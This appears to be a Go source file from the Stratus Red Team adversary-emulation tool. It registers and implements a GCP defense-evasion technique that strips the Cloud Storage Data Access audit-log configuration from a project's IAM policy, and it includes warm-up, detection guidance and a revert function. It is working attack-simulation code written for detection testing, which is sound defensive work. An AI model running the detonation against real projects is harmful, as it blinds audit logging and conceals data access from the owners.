package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	cloudresourcemanager "google.golang.org/api/cloudresourcemanager/v3"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.defense-evasion.disable-audit-logs",
		FriendlyName: "Disable Data Access Audit Logs for a GCP Service",
		Description: `
Removes the Data Access audit log configuration for Cloud Storage from the project
IAM policy. Data Access audit logs record data access operations such as reads and
writes to GCS objects. Disabling them reduces an attacker's visibility footprint in
Cloud Logging.

Warm-up:

- Enable Data Access audit logs (DATA_READ and DATA_WRITE) for <code>storage.googleapis.com</code>
  by adding an <code>auditConfig</code> entry to the project IAM policy

Detonation:

- Remove the <code>auditConfig</code> entry for <code>storage.googleapis.com</code> from the
  project IAM policy via the Cloud Resource Manager API

Revert:

- Re-add the <code>auditConfig</code> entry for <code>storage.googleapis.com</code> with DATA_READ
  and DATA_WRITE log types

References:

- https://cloud.google.com/logging/docs/audit/configure-data-access
- https://cloud.google.com/resource-manager/reference/rest/v3/projects/setIamPolicy
- https://attack.mitre.org/techniques/T1562/008/
- https://redcanary.com/threat-detection-report/trends/cloud-attacks/
- https://www.sysdig.com/blog/suspicious-activity-gcp-audit-logs
`,
		Detection: `
Identify when Data Access audit log configuration is removed from the project IAM policy
by monitoring for <code>SetIamPolicy</code> events in GCP Admin Activity audit logs where
the request removes or reduces <code>auditConfigs</code> entries.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.DefenseEvasion},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func newResourceManagerService(providers stratus.CloudProviders) (*cloudresourcemanager.Service, error) {
	svc, err := cloudresourcemanager.NewService(context.Background(), providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to instantiate Cloud Resource Manager client: %w", err)
	}
	return svc, nil
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	service := params["service"]
	resource := "projects/" + providers.GCP().GetProjectId()

	svc, err := newResourceManagerService(providers)
	if err != nil {
		return err
	}

	policy, err := svc.Projects.GetIamPolicy(resource, &cloudresourcemanager.GetIamPolicyRequest{
		Options: &cloudresourcemanager.GetPolicyOptions{RequestedPolicyVersion: 3},
	}).Do()
	if err != nil {
		return fmt.Errorf("failed to get project IAM policy: %w", err)
	}

	originalCount := len(policy.AuditConfigs)
	filtered := make([]*cloudresourcemanager.AuditConfig, 0, originalCount)
	for _, ac := range policy.AuditConfigs {
		if ac.Service != service {
			filtered = append(filtered, ac)
		}
	}

	if len(filtered) == originalCount {
		return fmt.Errorf("no auditConfig entry found for service %s — was warmup applied?", service)
	}

	log.Printf("Removing Data Access audit log configuration for %s from project IAM policy\n", service)
	// Send a minimal policy containing only etag and auditConfigs — no bindings.
	// With updateMask="auditConfigs", GCP merges only the auditConfigs field into the
	// stored policy. Including bindings in the request body causes GCP to validate them,
	// which fails if the project has stale bindings referencing deleted custom roles.
	_, err = svc.Projects.SetIamPolicy(resource, &cloudresourcemanager.SetIamPolicyRequest{
		Policy: &cloudresourcemanager.Policy{
			Etag:         policy.Etag,
			Version:      3,
			AuditConfigs: filtered,
		},
		UpdateMask: "auditConfigs",
	}).Do()
	if err != nil {
		return fmt.Errorf("failed to update project IAM policy: %w", err)
	}

	log.Printf("Successfully removed audit log configuration for %s\n", service)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	service := params["service"]
	resource := "projects/" + providers.GCP().GetProjectId()

	svc, err := newResourceManagerService(providers)
	if err != nil {
		return err
	}

	policy, err := svc.Projects.GetIamPolicy(resource, &cloudresourcemanager.GetIamPolicyRequest{
		Options: &cloudresourcemanager.GetPolicyOptions{RequestedPolicyVersion: 3},
	}).Do()
	if err != nil {
		return fmt.Errorf("failed to get project IAM policy: %w", err)
	}

	// Check whether the audit config already exists to keep the revert idempotent.
	for _, ac := range policy.AuditConfigs {
		if ac.Service == service {
			log.Printf("Audit log configuration for %s already present, nothing to restore\n", service)
			return nil
		}
	}

	newAuditConfigs := append(policy.AuditConfigs, &cloudresourcemanager.AuditConfig{
		Service: service,
		AuditLogConfigs: []*cloudresourcemanager.AuditLogConfig{
			{LogType: "DATA_READ"},
			{LogType: "DATA_WRITE"},
		},
	})
	log.Printf("Re-adding Data Access audit log configuration for %s\n", service)
	_, err = svc.Projects.SetIamPolicy(resource, &cloudresourcemanager.SetIamPolicyRequest{
		Policy: &cloudresourcemanager.Policy{
			Etag:         policy.Etag,
			Version:      3,
			AuditConfigs: newAuditConfigs,
		},
		UpdateMask: "auditConfigs",
	}).Do()
	if err != nil {
		return fmt.Errorf("failed to restore project IAM policy: %w", err)
	}

	log.Printf("Successfully restored audit log configuration for %s\n", service)
	return nil
}
